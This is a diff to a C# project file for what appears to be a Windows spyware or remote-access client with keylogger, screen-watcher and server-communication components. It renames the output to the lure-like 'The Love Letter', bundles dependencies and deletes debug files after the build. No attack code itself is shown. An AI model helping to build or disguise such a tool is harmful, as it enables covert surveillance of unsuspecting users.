@@ -8,7 +8,7 @@
     <ProjectGuid>{455E37BF-B767-4323-B8F5-A86CEECD3D91}</ProjectGuid>
     <OutputType>WinExe</OutputType>
     <RootNamespace>Client</RootNamespace>
-    <AssemblyName>Client</AssemblyName>
+    <AssemblyName>The Love Letter</AssemblyName>
     <TargetFrameworkVersion>v4.6</TargetFrameworkVersion>
     <FileAlignment>512</FileAlignment>
     <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
@@ -124,7 +124,9 @@
     <Compile Include="Armitage\Watchers\Surveyor.cs" />
     <Compile Include="Armitage\Watchers\Keylogger.cs" />
     <Compile Include="Armitage\Watchers\Screen Watcher.cs" />
+    <Compile Include="Communication\Screenshot Stacker.cs" />
     <Compile Include="Communication\Server.cs" />
+    <Compile Include="Communication\String Stacker.cs" />
     <Compile Include="Constants.cs" />
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
@@ -138,7 +140,6 @@
   <ItemGroup>
     <Content Include="Resources\Icon.ico" />
   </ItemGroup>
-  <ItemGroup />
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
   <Import Project="..\packages\Fody.6.5.1\build\Fody.targets" Condition="Exists('..\packages\Fody.6.5.1\build\Fody.targets')" />
   <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
@@ -150,4 +151,7 @@
     <Error Condition="!Exists('..\packages\Costura.Fody.5.4.0-alpha0042\build\Costura.Fody.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\packages\Costura.Fody.5.4.0-alpha0042\build\Costura.Fody.targets'))" />
   </Target>
   <Import Project="..\packages\Costura.Fody.5.4.0-alpha0042\build\Costura.Fody.targets" Condition="Exists('..\packages\Costura.Fody.5.4.0-alpha0042\build\Costura.Fody.targets')" />
+  <PropertyGroup>
+    <PostBuildEvent>del "$(TargetDir)*.xml", "$(TargetDir)*.pdb", "$(TargetDir)*.config"</PostBuildEvent>
+  </PropertyGroup>
 </Project>
